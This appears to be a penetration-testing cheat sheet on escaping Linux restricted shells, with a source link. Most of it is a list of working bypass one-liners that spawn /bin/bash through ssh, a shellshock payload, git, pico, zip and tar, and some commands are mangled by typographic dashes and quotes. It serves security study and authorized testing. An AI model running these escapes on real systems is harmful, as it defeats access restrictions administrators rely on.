# Escaping Restricted Shells

## Escaping

### Command injection
Imagine that we are in a restricted shell that allows us to execute commands by passing them as arguments to the ls command. Unfortunately, the shell only allows us to execute the ls command with a specific set of arguments, such as ls -l or ls -a, but it does not allow us to execute any other commands. In this situation, we can use command injection to escape from the shell by injecting additional commands into the argument of the ls command.

For example, we could use the following command to inject a pwd command into the argument of the ls command:

### Escaping Restricted Shells

```bash
ls -l `pwd` 
```

### Command Chaining
In some cases, it may be possible to escape from a restricted shell by using command chaining. We would need to use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (;) or a vertical bar (|), to execute a command. For example, if the shell allows users to execute commands separated by semicolons, it may be possible to escape from the shell by using a semicolon to separate two commands, one of which is not restricted by the shell.

### Advanced Techniques
Now let’s move into some dirty advance techniques.

```bash
# From ssh >
ssh username@IP – t “/bin/sh” or “/bin/bash”

# From ssh2 >
ssh username@IP -t “bash –noprofile”

# From ssh3 >
ssh username@IP -t “() { :; }; /bin/bash” (shellshock)

# From ssh4 >
ssh -o ProxyCommand=”sh -c /tmp/yourfile.sh” 127.0.0.1 (SUID)

# From git >
git help status > you can run it then !/bin/bash

# From pico >
pico -s “/bin/bash” then you can write /bin/bash and then CTRL + T

# From zip >
zip /tmp/test.zip /tmp/test -T –unzip-command=”sh -c /bin/bash”

# From tar >
tar cf /dev/null testfile –checkpoint=1 –checkpointaction=exec=/bin/bash
```

--------------------------------
https://vk9-sec.com/linux-restricted-shell-bypass/